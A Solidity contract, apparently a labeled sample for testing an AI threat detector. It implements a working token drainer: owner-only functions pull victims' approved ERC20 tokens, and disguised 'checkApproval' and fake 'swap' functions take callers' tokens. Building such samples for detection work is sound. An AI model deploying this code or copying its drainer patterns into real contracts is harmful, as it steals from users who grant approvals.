// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

/**
 * @title MaliciousContract
 * @notice THIS IS A DEMO MALICIOUS CONTRACT FOR TESTING SHIELDAI
 * 
 * This contract is INTENTIONALLY malicious to test AI threat detection.
 * It contains suspicious patterns that should trigger AI alerts:
 * - Unrestricted token draining
 * - No safety mechanisms
 * - Owner can steal any approved tokens
 * - Hidden backdoor functions
 */
contract MaliciousContract {
    address public owner;
    
    // Hidden mapping to track victims
    mapping(address => bool) private _drained;
    
    constructor() {
        owner = msg.sender;
    }
    
    /**
     * @notice MALICIOUS: Drains all approved tokens from a victim
     * @dev This function can steal any tokens that users have approved
     */
    function drainTokens(
        address token,
        address victim,
        uint256 amount
    ) external {
        require(msg.sender == owner, "Only owner");
        
        // Steal approved tokens without victim's consent
        IERC20(token).transferFrom(victim, owner, amount);
        
        _drained[victim] = true;
    }
    
    /**
     * @notice MALICIOUS: Drain all approved tokens from multiple victims at once
     * @dev Mass theft function
     */
    function drainMultiple(
        address token,
        address[] calldata victims
    ) external {
        require(msg.sender == owner, "Only owner");
        
        for (uint i = 0; i < victims.length; i++) {
            address victim = victims[i];
            uint256 allowance = IERC20(token).allowance(victim, address(this));
            
            if (allowance > 0) {
                IERC20(token).transferFrom(victim, owner, allowance);
                _drained[victim] = true;
            }
        }
    }
    
    /**
     * @notice MALICIOUS: Hidden backdoor - drain victim's entire balance
     * @dev This is the "honeypot" function
     */
    function _collect(address token, address victim) private {
        uint256 allowance = IERC20(token).allowance(victim, address(this));
        if (allowance > 0) {
            // Silently steal all approved tokens
            IERC20(token).transferFrom(
                victim,
                owner,
                allowance
            );
        }
    }
    
    /**
     * @notice Fake "safe" function that actually triggers theft
     * @dev Users think this is safe, but it calls _collect
     */
    function checkApproval(address token) external {
        // Pretends to be a read-only function
        // But actually steals tokens!
        _collect(token, msg.sender);
    }
    
    /**
     * @notice MALICIOUS: Emergency extraction function
     * @dev Owner can extract all tokens at any time
     */
    function emergencyWithdraw(address token) external {
        require(msg.sender == owner, "Only owner");
        
        uint256 balance = IERC20(token).balanceOf(address(this));
        IERC20(token).transferFrom(address(this), owner, balance);
    }
    
    /**
     * @notice Check if an address has been drained
     */
    function isDrained(address victim) external view returns (bool) {
        return _drained[victim];
    }
    
    /**
     * @notice Fake swap function (honeypot)
     * @dev Users approve thinking they'll swap, but contract steals tokens
     */
    function swap(
        address tokenIn,
        address tokenOut,
        uint256 amountIn
    ) external {
        // Pretends to be a DEX swap
        // Actually just steals the approved tokens
        IERC20(tokenIn).transferFrom(msg.sender, owner, amountIn);
        
        // No tokenOut is given back - classic rug pull
        _drained[msg.sender] = true;
    }
}
